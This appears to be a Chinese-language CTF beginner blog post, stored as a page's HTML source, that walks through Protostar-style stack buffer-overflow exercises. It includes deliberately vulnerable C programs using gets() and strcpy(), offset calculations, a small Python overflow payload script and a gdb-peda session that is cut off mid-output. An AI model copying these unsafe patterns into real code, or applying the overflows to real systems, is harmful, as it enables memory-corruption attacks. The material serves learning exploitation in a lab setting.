@@ -1,0 +1,1683 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="float">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="float">
+    <meta name="keywords" content="Hexo | float">
+    <meta name="description" content="">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>入坑Pwn---基本习题和知识 · float&#39;s blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180721 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180721 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >float&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">入坑Pwn---基本习题和知识</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>float's blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            入坑Pwn---基本习题和知识
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "PWN">PWN</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞挖掘">漏洞挖掘</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count">3,746</span> / Reading time: <span class="post-count">20 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/29</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <blockquote>
+<p>经过了多次比赛web的碰壁，发现现在单纯的web题已经很少见了。。大多都混合了如密码学、逆向等的知识。所以打算入坑pwn，打开新的大门。</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h2 id="要准备的工具-带后续补充"><a href="#要准备的工具-带后续补充" class="headerlink" title="要准备的工具(带后续补充)"></a>要准备的工具(带后续补充)</h2><p>　　逆向分析及动态调试用：IDAPro，Ollydbg<br>　　调试用：gdb，peda-gdb(或pwngdb这类基于gdb)，objdump<br>　　其他工具：ROPgadget，one_gadget，LibcSearcher, pwntools</p>
+<h2 id="Pwnable习题"><a href="#Pwnable习题" class="headerlink" title="Pwnable习题"></a>Pwnable习题</h2><h2 id="BUUCTF习题"><a href="#BUUCTF习题" class="headerlink" title="BUUCTF习题"></a>BUUCTF习题</h2><h2 id="简单示例习题"><a href="#简单示例习题" class="headerlink" title="简单示例习题"></a>简单示例习题</h2><p>　　<a href="https://www.anquanke.com/post/id/169554" target="_blank" rel="noopener">题目来源</a></p>
+<h3 id="Level0"><a href="#Level0" class="headerlink" title="Level0"></a>Level0</h3><p>　　题目源代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have changed the 'modified' variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again?\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>　　可以看到这个程序中有一个大小为64字节的buffer变量，以及一int型的变量modified。正常来说这个程序的执行肯定是输出”Try again?\n”。<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/1.png" alt=""><br>　　<br>　　但是这两个变量具有相同的栈底地址，并且buffer变量的输入是通过使用了一个不安全的函数gets()，这个函数之所以危险，是因为这个函数没有限制输入内容的上限，所以可以通过输入超过64字节的buffer变量来覆盖modified变量。<br>　　先扔进IDA里看一下反编译的代码：<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/2.png" alt=""><br>　　<br>　　可以看到变量数组和整型变量之间的地址相差<code>5CH - 10H = 4CH = 76字节</code>，所以用76个字节的数组输入之后，再填充一个非0的值就可以覆盖<code>modified</code>的变量值了。<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/3.png" alt="">
+　　</p>
+<h3 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h3><p>　　Level1和Level0大同小异，Level1的区别是在代码中没有使用gets()这样的不推荐使用的危险函数，但是以不恰当的方式使用了strcpy()这个函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(argc == <span class="number">1</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please specify an argument\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x61626364</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly got the variable to the right value\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>　　可以看到他将输入的参数argv直接拷贝进了buffer，而参数的长度也没有事先的进行检查。这个属于<code>复制和连接字符串</code>上的错误，其他如strcat()、sprintf()也可能会发生（推荐参考图书《C和C++安全编码》）<br>　　<br>　　这段代码要求modified变量的值为十六进制的0x61626364，与上题相同，这里只给出payload(<strong>注意小端序</strong>):<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/4.png" alt=""><br>　　<img src="/img/入坑Pwn-基本习题和知识/5.png" alt="">
+　　</p>
+<h3 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> modified;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">char</span> *variable;</span><br><span class="line"></span><br><span class="line">  variable = getenv(<span class="string">"GREENIE"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(variable == <span class="literal">NULL</span>) &#123;</span><br><span class="line">      errx(<span class="number">1</span>, <span class="string">"please set the GREENIE environment variable\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modified = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(buffer, variable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(modified == <span class="number">0x0d0a0d0a</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have correctly modified the variable\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Try again, you got 0x%08x\n"</span>, modified);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　这个也是大同小异，只不过增加了环境变量这个概念，下面是getevn函数的说明:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">DESCRIPTION</span><br><span class="line">       The getenv() <span class="keyword">function</span> searches the environment list to find the environment variable name, and returns a pointer to the corresponding value string.</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>　　当然这个从环境中获取的变量值的长度也是没有设定的，这里写一个简单的脚本，输出一个环境变量就可以了。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span> * <span class="number">64</span> + <span class="string">'\x0a\x0d\x0a\x0d'</span></span><br><span class="line">os.putenv(<span class="string">"GREENIE"</span>, payload)</span><br><span class="line">os.system(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">help on built-in function putenv in module posix:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">putenv(...)</span></span><br><span class="line"><span class="string">    putenv(key, value)</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Change or add an environment variable.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">volatile</span> <span class="title">int</span> <span class="params">(*fp)</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  fp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(fp) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"calling function pointer, jumping to 0x%08x\n"</span>, fp);</span><br><span class="line">      fp();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　扔进IDA。<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/6.png" alt=""><br>　　<br>　　算出地址差为<code>40H</code>即64字节。<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/7.png" alt=""><br>　　使用<code>objdump -d</code>命令找到win()函数的地址为<code>0x08048424</code>。<br>　　<br>　　<img src="/img/入坑Pwn-基本习题和知识/8.png" alt=""><br>　　注意一下小端序就可以了。<br>　　<br>　　这个简单的实例题演示了如何通过溢出覆写变量来改变程序的流程。
+　　</p>
+<h3 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code flow successfully changed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　这道题目虽然没有其他可以覆盖的变量来进行函数的跳转，但是我们可以通过溢出来覆写main函数的返回地址，从而来改变程序的执行流程，下面进行gdb的调试来判断栈的空间大小：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q level4</span><br><span class="line">Reading symbols from level4...</span><br><span class="line">gdb-peda$ pattern_create 100            <span class="comment">#创建一个保证可以溢出的长度的字符串用于输入</span></span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'</span></span><br><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/Desktop/PwnStudy/Level0-7/level4 </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd1d0 (<span class="string">"AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fa25c0 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xf7fa401c --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fa2000 --&gt; 0x1d6d6c </span><br><span 